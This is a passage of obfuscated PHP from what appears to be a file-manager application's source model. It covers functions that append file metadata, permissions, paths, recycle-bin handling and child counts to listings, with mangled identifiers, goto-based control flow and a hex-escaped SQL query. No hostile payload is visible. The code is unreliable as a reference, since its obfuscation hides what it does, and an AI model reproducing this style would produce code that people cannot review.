(!isset($C«‹Áâ‹ğ[$D’¶£¶Î¾ğ[$DÁ»ºÌë½Ñ[387]]])) { $C«‹Áâ‹ğ[$D’¶£¶Î¾ğ[$DÁ»ºÌë½Ñ[387]]] = array(); } if (in_array($D’¶£¶Î¾ğ[$DÁ»ºÌë½Ñ[92]], $BİÂÊ«’ÉÀ)) { continue; } $C«‹Áâ‹ğ[$D’¶£¶Î¾ğ[$DÁ»ºÌë½Ñ[387]]][$D’¶£¶Î¾ğ[$DÁ»ºÌë½Ñ[92]]] = $D’¶£¶Î¾ğ[$DÁ»ºÌë½Ñ[368]]; } foreach ($Få’‰¸ç« as &$få·İ÷ô•é) { $få·İ÷ô•é[$DÁ»ºÌë½Ñ[434]] = !1; if (isset($C«‹Áâ‹ğ[$få·İ÷ô•é[$DÁ»ºÌë½Ñ[387]]])) { $få·İ÷ô•é[$DÁ»ºÌë½Ñ[434]] = $C«‹Áâ‹ğ[$få·İ÷ô•é[$DÁ»ºÌë½Ñ[387]]]; } if ($this->fileIsLock($få·İ÷ô•é) && $få·İ÷ô•é[$DÁ»ºÌë½Ñ[394]]) { $dÉ­ñ»›‡ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $få·İ÷ô•é[$DÁ»ºÌë½Ñ[394]][$DÁ»ºÌë½Ñ[395]] = AuthModel::authDisable($få·İ÷ô•é[$DÁ»ºÌë½Ñ[394]][$DÁ»ºÌë½Ñ[395]], $dÉ­ñ»›‡); $få·İ÷ô•é[$DÁ»ºÌë½Ñ[394]][$DÁ»ºÌë½Ñ[435]][$DÁ»ºÌë½Ñ[394]] = $få·İ÷ô•é[$DÁ»ºÌë½Ñ[394]][$DÁ»ºÌë½Ñ[395]]; } } unset($få·İ÷ô•é); goto C‘© ¯ŞÎ; aŸ˜æ¡Ô®§: if (!$C¬æš­Øßæ) { return; } $BİÂÊ«’ÉÀ = array($DÁ»ºÌë½Ñ[432], $DÁ»ºÌë½Ñ[433]); $C«‹Áâ‹ğ = array(); goto fš´ò•¤ò; Aôù×ÌÕìœ: $DÁ»ºÌë½Ñ =& $_SERVER[Æ¼ôºÙï]; $E‹Õ¯°´É¾ = array($DÁ»ºÌë½Ñ[401] => array($DÁ»ºÌë½Ñ[402], $Eï²ö¢š‹‰)); $C¬æš­Øßæ = Model($DÁ»ºÌë½Ñ[430])->field($DÁ»ºÌë½Ñ[431])->where($E‹Õ¯°´É¾)->select(); goto aŸ˜æ¡Ô®§; C‘© ¯ŞÎ: } protected function _listAppendFileMeta(&$DÔ¼£»˜§‰, $Eë–¿ã˜é«) { goto EâÎÁŠ éË; e‹ÔæŞñÎ: if (!$f„Ú¹óœá) { return; } $eÏÜÀÀ»ñå = array($cÏÙ¦°ïßƒ[437] => array($cÏÙ¦°ïßƒ[402], $f„Ú¹óœá)); $DÎó„±í¿³ = $cÏÙ¦°ïßƒ[438]; goto eöÇÚÍâá; d“Î¸â«¦—: $Då›Ûñª­ = $Då›Ûñª­ ? $Då›Ûñª­ : array(); $eåØ¥Š¤ª = array(); foreach ($Då›Ûñª­ as $e­Ø‰Ã­—) { if (!isset($eåØ¥Š¤ª[$e­Ø‰Ã­—[$cÏÙ¦°ïßƒ[436]]])) { $eåØ¥Š¤ª[$e­Ø‰Ã­—[$cÏÙ¦°ïßƒ[436]]] = array(); } $eåØ¥Š¤ª[$e­Ø‰Ã­—[$cÏÙ¦°ïßƒ[436]]][$e­Ø‰Ã­—[$cÏÙ¦°ïßƒ[92]]] = $e­Ø‰Ã­—[$cÏÙ¦°ïßƒ[368]]; } goto B¬±‡¢ŞÛ; EâÎÁŠ éË: $cÏÙ¦°ïßƒ =& $_SERVER[Æ¼ôºÙï]; $f„Ú¹óœá = array_to_keyvalue($DÔ¼£»˜§‰, $cÏÙ¦°ïßƒ[33], $cÏÙ¦°ïßƒ[436]); $f„Ú¹óœá = array_filter(array_unique($f„Ú¹óœá)); goto e‹ÔæŞñÎ; eöÇÚÍâá: $Cä‹Å¿‘‚ = Model($cÏÙ¦°ïßƒ[439])->field($DÎó„±í¿³)->where($eÏÜÀÀ»ñå)->select(); $Cä‹Å¿‘‚ = array_to_keyvalue($Cä‹Å¿‘‚, $cÏÙ¦°ïßƒ[436]); $Då›Ûñª­ = Model($cÏÙ¦°ïßƒ[440])->field($cÏÙ¦°ïßƒ[441])->where($eÏÜÀÀ»ñå)->select(); goto d“Î¸â«¦—; B¬±‡¢ŞÛ: foreach ($DÔ¼£»˜§‰ as &$Dìêà»Üé’) { goto Dªù‡´ÚÔ„; C†Œ¸ù°ºõ: unset($Cä‹Å¿‘‚[$e«ÓºƒÈ‚][$cÏÙ¦°ïßƒ[75]]); $eñ½ÇÈÆíö = is_array($eåØ¥Š¤ª[$e«ÓºƒÈ‚]) ? $eåØ¥Š¤ª[$e«ÓºƒÈ‚] : array(); $Dìêà»Üé’[$cÏÙ¦°ïßƒ[163]] = array_merge($eñ½ÇÈÆíö, $Cä‹Å¿‘‚[$e«ÓºƒÈ‚]); goto c§œ®Ï‡à‡; c§œ®Ï‡à‡: if (isset($Dìêà»Üé’[$cÏÙ¦°ïßƒ[163]][$cÏÙ¦°ïßƒ[162]])) { $Dìêà»Üé’[$cÏÙ¦°ïßƒ[162]] = json_decode($Dìêà»Üé’[$cÏÙ¦°ïßƒ[163]][$cÏÙ¦°ïßƒ[162]], !0); unset($Dìêà»Üé’[$cÏÙ¦°ïßƒ[163]][$cÏÙ¦°ïßƒ[162]]); } goto d¤§Ş•Òì©; Dªù‡´ÚÔ„: $e«ÓºƒÈ‚ = $Dìêà»Üé’[$cÏÙ¦°ïßƒ[436]]; if (!$e«ÓºƒÈ‚ || !isset($Cä‹Å¿‘‚[$e«ÓºƒÈ‚])) { continue; } $EˆŸ“ÔÖÔ = $Cä‹Å¿‘‚[$e«ÓºƒÈ‚]; goto b“ĞÉìŞ”; b“ĞÉìŞ”: $EˆŸ“ÔÖÔ[$cÏÙ¦°ïßƒ[77]] = $Dìêà»Üé’[$cÏÙ¦°ïßƒ[77]]; $EˆŸ“ÔÖÔ[$cÏÙ¦°ïßƒ[28]] = $Dìêà»Üé’[$cÏÙ¦°ïßƒ[28]]; if (!isset(self::$cacheFileInfo[$cÏÙ¦°ïßƒ[442] . $e«ÓºƒÈ‚])) { self::$cacheFileInfo[$cÏÙ¦°ïßƒ[442] . $e«ÓºƒÈ‚] = array_merge(array(), $EˆŸ“ÔÖÔ); } goto C†Œ¸ù°ºõ; d¤§Ş•Òì©: } unset($Dìêà»Üé’); goto fâ„ßÒùÅÓ; fâ„ßÒùÅÓ: } protected function _listAppendSourceInfo(&$bµ»Ï¢ã›Î, $EçÊ‰ÀÂ“) { goto BÎ‘‹ÉÀ; BÎ‘‹ÉÀ: $c†ÕªÙ É =& $_SERVER[Æ¼ôºÙï]; if (!defined($c†ÕªÙ É[443])) { return; } $AÃØ³¡ì‰Ô = Model($c†ÕªÙ É[444])->listData(); goto bÑĞ¾Á¼ê¾; Aİ©…¤íÕ: $Cô¸‡™ïØ‘ = array_to_keyvalue_group($aŞ¾¥‡ùÕ², $c†ÕªÙ É[387]); foreach ($bµ»Ï¢ã›Î as &$D°©·ÙŠÒõ) { $D°©·ÙŠÒõ[$c†ÕªÙ É[84]] = array($c†ÕªÙ É[446] => 0, $c†ÕªÙ É[447] => 0, $c†ÕªÙ É[448] => 0); if (isset($b„ªÁ†å¯[$D°©·ÙŠÒõ[$c†ÕªÙ É[387]]])) { $D°©·ÙŠÒõ[$c†ÕªÙ É[84]][$c†ÕªÙ É[449]] = 1; $D°©·ÙŠÒõ[$c†ÕªÙ É[84]][$c†ÕªÙ É[450]] = $b„ªÁ†å¯[$D°©·ÙŠÒõ[$c†ÕªÙ É[387]]][$c†ÕªÙ É[28]]; } if (isset($cä‹™Ä³™‚[$D°©·ÙŠÒõ[$c†ÕªÙ É[387]]])) { $D°©·ÙŠÒõ[$c†ÕªÙ É[84]][$c†ÕªÙ É[451]] = array(); foreach ($cä‹™Ä³™‚[$D°©·ÙŠÒõ[$c†ÕªÙ É[387]]] as $d‚øİ‚ãó¨) { $B± İÈîÅ„ = $bÄ—¬óŞ­²[$d‚øİ‚ãó¨]; $D°©·ÙŠÒõ[$c†ÕªÙ É[84]][$c†ÕªÙ É[451]][] = array($c†ÕªÙ É[452] => $B± İÈîÅ„[$c†ÕªÙ É[385]], $c†ÕªÙ É[404] => $B± İÈîÅ„[$c†ÕªÙ É[28]], $c†ÕªÙ É[453] => $B± İÈîÅ„[$c†ÕªÙ É[454]]); } } if (isset($Cô¸‡™ïØ‘[$D°©·ÙŠÒõ[$c†ÕªÙ É[387]]])) { $D°©·ÙŠÒõ[$c†ÕªÙ É[84]][$c†ÕªÙ É[455]] = array(); foreach ($Cô¸‡™ïØ‘[$D°©·ÙŠÒõ[$c†ÕªÙ É[387]]] as $cöÖ„É›ÚĞ) { $D°©·ÙŠÒõ[$c†ÕªÙ É[84]][$c†ÕªÙ É[455]] = array($c†ÕªÙ É[456] => $cöÖ„É›ÚĞ[$c†ÕªÙ É[457]], $c†ÕªÙ É[458] => $cöÖ„É›ÚĞ[$c†ÕªÙ É[459]], $c†ÕªÙ É[460] => $cöÖ„É›ÚĞ[$c†ÕªÙ É[387]], $c†ÕªÙ É[461] => $cöÖ„É›ÚĞ[$c†ÕªÙ É[462]], $c†ÕªÙ É[463] => $cöÖ„É›ÚĞ[$c†ÕªÙ É[464]], $c†ÕªÙ É[465] => $cöÖ„É›ÚĞ[$c†ÕªÙ É[465]], $c†ÕªÙ É[466] => $cöÖ„É›ÚĞ[$c†ÕªÙ É[466]]); } } } unset($D°©·ÙŠÒõ); goto eé„™ÒË¥‚; bÑĞ¾Á¼ê¾: $b¡«£“ãŠ = Model($c†ÕªÙ É[409])->listData(); $eğ‰ç™É½† = Model($c†ÕªÙ É[399])->listData(); $aŞ¾¥‡ùÕ² = Model($c†ÕªÙ É[445])->listSimple(); goto dóÇòÁ‘µË; dóÇòÁ‘µË: $bÄ—¬óŞ­² = array_to_keyvalue($AÃØ³¡ì‰Ô, $c†ÕªÙ É[385]); $cä‹™Ä³™‚ = array_to_keyvalue_group($b¡«£“ãŠ, $c†ÕªÙ É[75], $c†ÕªÙ É[410]); $b„ªÁ†å¯ = array_to_keyvalue($eğ‰ç™É½†, $c†ÕªÙ É[75]); goto Aİ©…¤íÕ; eé„™ÒË¥‚: return $bµ»Ï¢ã›Î; goto fé­›æ²¿¢; fé­›æ²¿¢: } protected function _listAppendChildren(&$bÃÇÉç‰ğ, $aÈŒëÀ±ö) { goto A­Œšƒñ…å; aé´®º¡Òò: foreach ($bÃÇÉç‰ğ as &$C®à‚¦–ì‰) { if ($C®à‚¦–ì‰[$BÛ©ñÄÜÖ[388]]) { unset($C®à‚¦–ì‰[$BÛ©ñÄÜÖ[390]]); $C®à‚¦–ì‰[$BÛ©ñÄÜÖ[202]] = intval($B¢¾ø‡„ƒĞ[$C®à‚¦–ì‰[$BÛ©ñÄÜÖ[387]] . $BÛ©ñÄÜÖ[469]][$BÛ©ñÄÜÖ[470]]); $C®à‚¦–ì‰[$BÛ©ñÄÜÖ[201]] = intval($B¢¾ø‡„ƒĞ[$C®à‚¦–ì‰[$BÛ©ñÄÜÖ[387]] . $BÛ©ñÄÜÖ[471]][$BÛ©ñÄÜÖ[470]]); } } unset($C®à‚¦–ì‰); goto e¿ğÓ‚ÌÌ; aÓÛğ¯…©Î: $F¨«¯®ë¼› = 1024 * 50; $bÃÇÉç‰ğ = is_array($bÃÇÉç‰ğ) ? $bÃÇÉç‰ğ : array(); $fŒÆ¤Ì—áæ = count($bÃÇÉç‰ğ); goto B±‚óì½Í¶; A­Œšƒñ…å: $BÛ©ñÄÜÖ =& $_SERVER[Æ¼ôºÙï]; $d˜“é—Šš = $BÛ©ñÄÜÖ[370]; $B¢¾ø‡„ƒĞ = array(); goto aÓÛğ¯…©Î; B±‚óì½Í¶: $b»ˆ´—–µ = $this->tablePrefix . $this->tableName; for ($B¾´Å•Üå = 0; $B¾´Å•Üå < $fŒÆ¤Ì—áæ; $B¾´Å•Üå++) { $d³Š™Ø²£½ = intval($bÃÇÉç‰ğ[$B¾´Å•Üå][$BÛ©ñÄÜÖ[414]]); if ($bÃÇÉç‰ğ[$B¾´Å•Üå][$BÛ©ñÄÜÖ[388]]) { $d÷¡ÏÒ„´ç = $bÃÇÉç‰ğ[$B¾´Å•Üå][$BÛ©ñÄÜÖ[387]]; $d˜“é—Šš .= "\123\105\114\105\x43\124\x20\x2a\40\106\122\117\x4d\x20\50\x53\x45\114\105\103\124\x20\x27{$d÷¡ÏÒ„´ç}\x5f\150\141\163\x46\151\x6c\145\x27\x20\x61\x73\x20\150\141\163\x2c\x63\157\165\156\164\50\61\x29\x20\141\163\40\x68\141\163\103\x6f\165\156\164\40\106\x52\117\x4d\x20\140{$b»ˆ´—–µ}\x60\40\12\x9\11\11\11\x9\x77\150\x65\162\x65\40\x70\141\162\x65\156\x74\x49\x44\x3d{$d÷¡ÏÒ„´ç}\40\141\x6e\144\x20\x69\x73\x46\157\154\144\145\x72\75\60\x20\141\x6e\x64\x20\151\163\104\x65\154\x65\x74\x65\75{$d³Š™Ø²£½}\51\40\x61\163\x20\164\142\x31\137{$d÷¡ÏÒ„´ç}\40\165\x6e\151\x6f\x6e\x20\x61\x6c\154\40\xa\x9\11\x9\x9\x9\123\105\x4c\105\103\124\x20\x2a\40\x46\122\117\x4d\40\x28\x53\105\x4c\x45\103\x54\x20\x27{$d÷¡ÏÒ„´ç}\x5f\150\x61\163\106\x6f\x6c\x64\x65\x72\47\x20\141\x73\40\x68\x61\x73\106\151\x6c\145\x2c\x63\x6f\165\156\164\x28\61\x29\x20\x61\x73\40\150\x61\163\103\157\165\156\x74\x20\106\122\117\115\40\x60{$b»ˆ´—–µ}\x60\x20\xa\x9\11\11\11\11\x77\x68\145\162\x65\40\160\x61\x72\x65\156\164\x49\x44\75{$d÷¡ÏÒ„´ç}\x20\x61\156\x64\40\x69\x73\x46\157\154\x64\145\162\75\61\x20\141\x6e\x64\40\x69\x73\x44\145\154\145\164\x65\x3d{$d³Š™Ø²£½}\x29\40\141\163\40\x74\142\x32\x5f{$d÷¡ÏÒ„´ç}\40\x75\156\x69\157\156\x20\x61\x6c\154\x20"; } if ((strlen($d˜“é—Šš) >= $F¨«¯®ë¼› || $B¾´Å•Üå == $fŒÆ¤Ì—áæ - 1) && $d˜“é—Šš) { $d˜“é—Šš = substr($d˜“é—Šš, 0, -strlen($BÛ©ñÄÜÖ[467])); $F¾äİÂ¦ = $this->query($d˜“é—Šš); $B¢¾ø‡„ƒĞ = array_merge($B¢¾ø‡„ƒĞ, $F¾äİÂ¦); $d˜“é—Šš = $BÛ©ñÄÜÖ[33]; } } $B¢¾ø‡„ƒĞ = array_to_keyvalue($B¢¾ø‡„ƒĞ, $BÛ©ñÄÜÖ[468]); goto aé´®º¡Òò; e¿ğÓ‚ÌÌ: } protected function _listAppendAuth(&$bÅÛç¢¹Å‹) { goto CêÁòÍô; FöÈ°¥ŞªŒ: $cŞ‚°ù’á¶ = Model($e÷ô¦½ãŸ[472])->getSourceList($fÙÜõˆŒ§ø, $d¢¸¼‡¹Ğœ); foreach ($bÅÛç¢¹Å‹ as $bß²ç™óá => &$B†â’£ªÁÎ) { $B†â’£ªÁÎ[$e÷ô¦½ãŸ[394]] = $cŞ‚°ù’á¶[$B†â’£ªÁÎ[$e÷ô¦½ãŸ[387]]]; if (!$B†â’£ªÁÎ[$e÷ô¦½ãŸ[394]] && $B†â’£ªÁÎ[$e÷ô¦½ãŸ[389]] == self::TYPE_GROUP) { $B†â’£ªÁÎ[$e÷ô¦½ãŸ[394]] = Action($e÷ô¦½ãŸ[473])->pathGroupAuthMake($B†â’£ªÁÎ[$e÷ô¦½ãŸ[474]]); if (!$B†â’£ªÁÎ[$e÷ô¦½ãŸ[394]] && !_get($GLOBALS, $e÷ô¦½ãŸ[475])) { $B†â’£ªÁÎ[$e÷ô¦½ãŸ[194]] = !1; $B†â’£ªÁÎ[$e÷ô¦½ãŸ[193]] = !1; } } if ($B†â’£ªÁÎ[$e÷ô¦½ãŸ[394]]) { $B†â’£ªÁÎ[$e÷ô¦½ãŸ[194]] = AuthModel::authCheckEdit($B†â’£ªÁÎ[$e÷ô¦½ãŸ[394]][$e÷ô¦½ãŸ[395]]); $B†â’£ªÁÎ[$e÷ô¦½ãŸ[193]] = AuthModel::authCheckView($B†â’£ªÁÎ[$e÷ô¦½ãŸ[394]][$e÷ô¦½ãŸ[395]]); } $this->groupPathDisplay($B†â’£ªÁÎ); } unset($B†â’£ªÁÎ); goto C‚…Êâ’İ×; CêÁòÍô: $e÷ô¦½ãŸ =& $_SERVER[Æ¼ôºÙï]; if (!defined($e÷ô¦½ãŸ[443])) { return; } $fÙÜõˆŒ§ø = array(); goto e’ÆˆÚøÚÑ; e’ÆˆÚøÚÑ: foreach ($bÅÛç¢¹Å‹ as $B†â’£ªÁÎ) { if ($B†â’£ªÁÎ[$e÷ô¦½ãŸ[389]] == self::TYPE_GROUP) { $fÙÜõˆŒ§ø[] = $B†â’£ªÁÎ[$e÷ô¦½ãŸ[387]]; } } if (!$fÙÜõˆŒ§ø) { return; } $d¢¸¼‡¹Ğœ = array_to_keyvalue($bÅÛç¢¹Å‹, $e÷ô¦½ãŸ[387]); goto FöÈ°¥ŞªŒ; C‚…Êâ’İ×: } public function groupPathDisplay(&$BáŞÓæ¾Şƒ) { goto Fê‡£Ï²®; eöÖ´êÛ‹Û: $BáŞÓæ¾Şƒ[$B‰å¬ğÉ²[482]] = $fÁæÙ¡©¶ó . $Bä ‡òéó×[$B‰å¬ğÉ²[84]][$B‰å¬ğÉ²[387]]; goto f‰í®¤¢ùô; Fê‡£Ï²®: $B‰å¬ğÉ² =& $_SERVER[Æ¼ôºÙï]; if ($BáŞÓæ¾Şƒ[$B‰å¬ğÉ²[389]] != self::TYPE_GROUP) { return; } $Bä ‡òéó× = Model($B‰å¬ğÉ²[476])->getInfo($BáŞÓæ¾Şƒ[$B‰å¬ğÉ²[474]]); goto c»Áµ‡¨Î; C·õÏè¿Ïó: $BáŞÓæ¾Şƒ[$B‰å¬ğÉ²[478]] = $Bä ‡òéó×[$B‰å¬ğÉ²[479]]; $BáŞÓæ¾Şƒ[$B‰å¬ğÉ²[398]] = $Bä ‡òéó×[$B‰å¬ğÉ²[477]]; $BáŞÓæ¾Şƒ[$B‰å¬ğÉ²[480]] = $Bä ‡òéó×[$B‰å¬ğÉ²[481]]; goto eöÖ´êÛ‹Û; c»Áµ‡¨Î: $d‹Œëëƒˆ = $this->parentLevelArray($Bä ‡òéó×[$B‰å¬ğÉ²[477]]); $fÁæÙ¡©¶ó = $B‰å¬ğÉ²[33]; foreach ($d‹Œëëƒˆ as $EÉŠ¸ì‰º¿) { $EÔ´¤Åâ™ = Model($B‰å¬ğÉ²[476])->getInfo($EÉŠ¸ì‰º¿); $fÁæÙ¡©¶ó .= $EÔ´¤Åâ™[$B‰å¬ğÉ²[84]][$B‰å¬ğÉ²[387]] . $B‰å¬ğÉ²[47]; } goto C·õÏè¿Ïó; f‰í®¤¢ùô: } protected function _listAppendPath(&$D‰ç–ÊÓÕ×) { goto cßàìñÙâø; Fô÷ŞÙÙŒØ: foreach ($D‰ç–ÊÓÕ× as &$a·º°Óãé) { $e…áÖÏƒ¶Ä[$a·º°Óãé[$Cî”² ‹­Ã[387]]] = $a·º°Óãé[$Cî”² ‹­Ã[28]]; $bñÄ°¼µñ– = $this->parentLevelArray($a·º°Óãé[$Cî”² ‹­Ã[477]]); foreach ($bñÄ°¼µñ– as $CšÉÖˆ½â => $Fâ¯ƒƒÌÄ¢) { if ($CšÉÖˆ½â != 0 && !isset($e…áÖÏƒ¶Ä[$Fâ¯ƒƒÌÄ¢])) { $A§«‡¡ÌŠ[] = $Fâ¯ƒƒÌÄ¢; } } } unset($a·º°Óãé); if (count($A§«‡¡ÌŠ) > 0) { $DÚ…†Éê« = array($Cî”² ‹­Ã[401] => array($Cî”² ‹­Ã[402], $A§«‡¡ÌŠ)); if (count($A§«‡¡ÌŠ) == 1) { $fï…‰—®¡ = $this->sourceInfo($A§«‡¡ÌŠ[0]); $a²ìøá¸’ˆ = is_array($fï…‰—®¡) ? array($fï…‰—®¡) : !1; } else { $a²ìøá¸’ˆ = $this->field($Cî”² ‹­Ã[483])->where($DÚ…†Éê«)->select(); } $CŸó»Òğ‚± = array_to_keyvalue($a²ìøá¸’ˆ, $Cî”² ‹­Ã[387], $Cî”² ‹­Ã[28]); $e…áÖÏƒ¶Ä = array_merge_index($e…áÖÏƒ¶Ä, $CŸó»Òğ‚±); } goto F„ö–È“ïÖ; cßàìñÙâø: $Cî”² ‹­Ã =& $_SERVER[Æ¼ôºÙï]; static $e…áÖÏƒ¶Ä = array(); $A§«‡¡ÌŠ = array(); goto Fô÷ŞÙÙŒØ; F„ö–È“ïÖ: $BÂÓº«æ‡İ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($D‰ç–ÊÓÕ× as &$a·º°Óãé) { goto D…ğ¤ÍÂ; D…ğ¤ÍÂ: $bñÄ°¼µñ– = $this->parentLevelArray($a·º°Óãé[$Cî”² ‹­Ã[477]]); $eğæîÙŸ‡“ = $this->_listAppendPathRoot($a·º°Óãé, $bñÄ°¼µñ–); foreach ($bñÄ°¼µñ– as $CšÉÖˆ½â => $Fâ¯ƒƒÌÄ¢) { if ($CšÉÖˆ½â == 0 && $eğæîÙŸ‡“ && $a·º°Óãé[$Cî”² ‹­Ã[389]] == self::TYPE_GROUP) { continue; } if (isset($e…áÖÏƒ¶Ä[$Fâ¯ƒƒÌÄ¢])) { $eğæîÙŸ‡“ .= $e…áÖÏƒ¶Ä[$Fâ¯ƒƒÌÄ¢] . $Cî”² ‹­Ã[8]; } } goto b’°Ê‡âÔ; b’°Ê‡âÔ: if ($bñÄ°¼µñ–) { $eğæîÙŸ‡“ .= $a·º°Óãé[$Cî”² ‹­Ã[28]]; } if ($a·º°Óãé[$Cî”² ‹­Ã[388]]) { $eğæîÙŸ‡“ .= $Cî”² ‹­Ã[8]; } $a·º°Óãé[$Cî”² ‹­Ã[484]] = str_replace($Cî”² ‹­Ã[485], $Cî”² ‹­Ã[8], $eğæîÙŸ‡“); goto C•œ‡ò‹‚ø; C•œ‡ò‹‚ø: $EôÊ×öÜÕ¹ = trim($a·º°Óãé[$Cî”² ‹­Ã[484]], $Cî”² ‹­Ã[8]); if ($a·º°Óãé[$Cî”² ‹­Ã[479]] == $Cî”² ‹­Ã[486] && $EôÊ×öÜÕ¹) { $a·º°Óãé[$Cî”² ‹­Ã[28]] = $EôÊ×öÜÕ¹; } $this->_listAppendPathRecycle($a·º°Óãé, $bñÄ°¼µñ–, $BÂÓº«æ‡İ); goto fó÷·Ë; fó÷·Ë: } unset($a·º°Óãé); goto d¥Êğ’òÅ—; d¥Êğ’òÅ—: return $D‰ç–ÊÓÕ×; goto AÆ¢Õ¹—ãˆ; AÆ¢Õ¹—ãˆ: } private function _listAppendPathRecycle(&$cëì®§ÇÅ˜, $F¯ÂÜõ©à¥, $EÓïÌ›») { goto DÕ…øŒÑ »; F¬†¢ƒĞƒ: $cëì®§ÇÅ˜[$d»áœÂ˜Æ[477]] = $d»áœÂ˜Æ[488] . implode($d»áœÂ˜Æ[47], array_slice($F¯ÂÜõ©à¥, 1)) . $d»áœÂ˜Æ[47]; if ($cëì®§ÇÅ˜[$d»áœÂ˜Æ[387]] == $EÓïÌ›») { $cëì®§ÇÅ˜[$d»áœÂ˜Æ[477]] = $d»áœÂ˜Æ[488]; $cëì®§ÇÅ˜[$d»áœÂ˜Æ[479]] = $d»áœÂ˜Æ[486]; $cëì®§ÇÅ˜[$d»áœÂ˜Æ[28]] = LNG($d»áœÂ˜Æ[487]); } $cëì®§ÇÅ˜[$d»áœÂ˜Æ[489]] = $d»áœÂ˜Æ[490]; goto dÎ–ÈËŒ»©; b¹–Œ§«¢í: $F×“£½Û†‹ = explode($d»áœÂ˜Æ[8], trim($cëì®§ÇÅ˜[$d»áœÂ˜Æ[484]], $d»áœÂ˜Æ[8])); $c„É™´• = implode($d»áœÂ˜Æ[8], array_slice($F×“£½Û†‹, 2)); $cëì®§ÇÅ˜[$d»áœÂ˜Æ[484]] = $d»áœÂ˜Æ[8] . LNG($d»áœÂ˜Æ[487]) . $d»áœÂ˜Æ[8] . ltrim($c„É™´•, $d»áœÂ˜Æ[8]); goto F¬†¢ƒĞƒ; DÕ…øŒÑ »: $d»áœÂ˜Æ =& $_SERVER[Æ¼ôºÙï]; if (intval($cëì®§ÇÅ˜[$d»áœÂ˜Æ[389]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($EÓïÌ›», $F¯ÂÜõ©à¥) && $cëì®§ÇÅ˜[$d»áœÂ˜Æ[387]] != $EÓïÌ›») { return; } goto b¹–Œ§«¢í; dÎ–ÈËŒ»©: } protected function _listAppendPathRoot(&$C‘¤ãåá»Æ, $DÜç·‘‰Ç˜) { $D»ŒƒŠĞˆ¢ =& $_SERVER[Æ¼ôºÙï]; $A°Ú¾µÑÖ = $D»ŒƒŠĞˆ¢[33]; if ($C‘¤ãåá»Æ[$D»ŒƒŠĞˆ¢[389]] == self::TYPE_USER) { if (defined($D»ŒƒŠĞˆ¢[443]) && $C‘¤ãåá»Æ[$D»ŒƒŠĞˆ¢[474]] == USER_ID) { $A°Ú¾µÑÖ = LNG($D»ŒƒŠĞˆ¢[491]); if (!$DÜç·‘‰Ç˜) { $C‘¤ãåá»Æ[$D»ŒƒŠĞˆ¢[28]] = $A°Ú¾µÑÖ; } } else { $F‘º•ãÌË = Model($D»ŒƒŠĞˆ¢[492])->getInfoSimple($C‘¤ãåá»Æ[$D»ŒƒŠĞˆ¢[474]]); $A°Ú¾µÑÖ = LNG($D»ŒƒŠĞˆ¢[493]) . $D»ŒƒŠĞˆ¢[159] . $F‘º•ãÌË[$D»ŒƒŠĞˆ¢[28]] . $D»ŒƒŠĞˆ¢[494]; } } else { if ($C‘¤ãåá»Æ[$D»ŒƒŠĞˆ¢[389]] == self::TYPE_GROUP) { $F‘º•ãÌË = Model($D»ŒƒŠĞˆ¢[476])->getInfoSimple($C‘¤ãåá»Æ[$D»ŒƒŠĞˆ¢[474]]); $A°Ú¾µÑÖ = $F‘º•ãÌË[$D»ŒƒŠĞˆ¢[28]]; } else { if ($C‘¤ãåá»Æ[$D»ŒƒŠĞˆ¢[389]] == self::TYPE_SYSTEM) { $F‘º•ãÌË = $this->sourceInfo($DÜç·‘‰Ç˜[0], !0); $A°Ú¾µÑÖ = $F‘º•ãÌË[$D»ŒƒŠĞˆ¢[28]]; } } } $A°Ú¾µÑÖ = $A°Ú¾µÑÖ ? $D»ŒƒŠĞˆ¢[8] . $A°Ú¾µÑÖ . $D»ŒƒŠĞˆ¢[8] : $D»ŒƒŠĞˆ¢[8]; return $A°Ú¾µÑÖ; } protected function _listAppendUser(&$c‹İ Áà») { goto b¦Œåª¸Â; cœğ‡«»¿Í: $CòáÚ¢¤—Æ = array_merge($A¸ì¡Œğí, $c÷ªÀÔôê¥); $f¿òÏ†Œ¸ = Model($F÷‘ ‡¬ß¶[495])->userListInfo($CòáÚ¢¤—Æ); foreach ($c‹İ Áà» as &$FÍÌÄ¸‘ÂÍ) { $E»Áš†‚ò… = $FÍÌÄ¸‘ÂÍ[$F÷‘ ‡¬ß¶[396]]; $FÍÌÄ¸‘ÂÍ[$F÷‘ ‡¬ß¶[396]] = $f¿òÏ†Œ¸[$E»Áš†‚ò…] ? $f¿òÏ†Œ¸[$E»Áš†‚ò…] : !1; $E»Áš†‚ò… = $FÍÌÄ¸‘ÂÍ[$F÷‘ ‡¬ß¶[397]]; $FÍÌÄ¸‘ÂÍ[$F÷‘ ‡¬ß¶[397]] = $f¿òÏ†Œ¸[$E»Áš†‚ò…] ? $f¿òÏ†Œ¸[$E»Áš†‚ò…] : !1; if (isset($FÍÌÄ¸‘ÂÍ[$F÷‘ ‡¬ß¶[434]]) && $FÍÌÄ¸‘ÂÍ[$F÷‘ ‡¬ß¶[434]][$F÷‘ ‡¬ß¶[496]]) { $bîö·Å½‰º = $GLOBALS[$F÷‘ ‡¬ß¶[6]][$F÷‘ ‡¬ß¶[87]][$F÷‘ ‡¬ß¶[497]]; if ($FÍÌÄ¸‘ÂÍ[$F÷‘ ‡¬ß¶[434]][$F÷‘ ‡¬ß¶[498]] <= time() - $bîö·Å½‰º) { $this->metaSet($FÍÌÄ¸‘ÂÍ[$F÷‘ ‡¬ß¶[387]], $F÷‘ ‡¬ß¶[496], null); $this->metaSet($FÍÌÄ¸‘ÂÍ[$F÷‘ ‡¬ß¶[387]], $F÷‘ ‡¬ß¶[498], null); unset($FÍÌÄ¸‘ÂÍ[$F÷‘ ‡¬ß¶[434]][$F÷‘ ‡¬ß¶[496]]); continue; } $d­É±ÄøÈ¿ = $FÍÌÄ¸‘ÂÍ[$F÷‘ ‡¬ß¶[434]][$F÷‘ ‡¬ß¶[496]]; $FÍÌÄ¸‘ÂÍ[$F÷‘ ‡¬ß¶[434]][$F÷‘ ‡¬ß¶[499]] = Model($F÷‘ ‡¬ß¶[495])->getInfoSimpleOuter($d­É±ÄøÈ¿); } } goto A‹’ÖµËÎ; A‹’ÖµËÎ: unset($FÍÌÄ¸‘ÂÍ); goto FËÜóéİì; b¦Œåª¸Â: $F÷‘ ‡¬ß¶ =& $_SERVER[Æ¼ôºÙï]; $A¸ì¡Œğí = array_to_keyvalue($c‹İ Áà», $F÷‘ ‡¬ß¶[33], $F÷‘ ‡¬ß¶[396]); $c÷ªÀÔôê¥ = array_to_keyvalue($c‹İ Áà», $F÷‘ 